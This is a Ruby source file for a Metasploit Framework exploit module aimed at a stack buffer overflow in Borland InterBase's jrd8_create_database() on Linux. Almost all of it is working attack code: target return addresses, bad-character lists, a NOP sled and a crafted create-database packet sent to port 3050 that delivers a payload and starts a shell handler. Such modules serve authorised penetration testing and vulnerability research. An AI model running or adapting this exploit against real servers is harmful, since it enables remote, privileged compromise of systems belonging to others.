##
# $Id: ib_jrd8_create_database.rb 5136 2007-10-04 03:03:13Z ramon $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Linux::Misc::Ib_Create < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Borland InterBase jrd8_create_database() Buffer Overflow',
			'Description'	=> %q{
				This module exploits a stack overflow in Borland InterBase
				by sending a specially crafted create request.
			},
			'Version'	=> '$Revision: 5136 $',
			'Author'	=>
				[
					'Ramon de Carvalho Valle <ramon@risesecurity.org>',
					'Adriano Lima <adriano@risesecurity.org>',
				],
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'linux',
			'References'	=>
				[
					[ 'URL', 'http://risesecurity.org/advisory/RISE-2007002/' ],
				],
			'Privileged'	=> true,
			'License'	=> MSF_LICENSE,
			'Payload'	=>
				{
					'Space' => 128,
					'BadChars' => "\x00\x2f\x3a\x40\x5c",
				},
			'Targets'	=>
				[
					# 0x0804cbe4 pop esi; pop ebp; ret
					[
						'Borland InterBase LI-V8.0.0.53 LI-V8.0.0.54 LI-V8.1.0.253',
						{ 'Ret' => 0x0804cbe4 }
					],
				],
			'DefaultTarget'	=> 0
		))

		register_options(
			[
				Opt::RPORT(3050)
			],
			self.class
		)

	end

	def exploit

		connect

		# Create database
		op_create = 20

		length = 544
		remainder = length.remainder(4)
		padding = 0

		if remainder > 0
			padding = (4 - remainder)
		end

		buf = ''

		# Operation/packet type
		buf << [op_create].pack('N')

		# Id
		buf << [0].pack('N')

		# Length
		buf << [length].pack('N')

		# It will return into this nop block
		buf << make_nops(length - payload.encoded.length - 4)

		# Payload
		buf << payload.encoded

		# Target
		buf << [target.ret].pack('V')

		# Padding
		buf << "\x00" * padding

		# Database parameter block

		# Length
		buf << [1024 * 32].pack('N')

		# Random alpha data
		buf << rand_text_alpha(1024 * 32)

		sock.put(buf)

		handler

	end

end

end

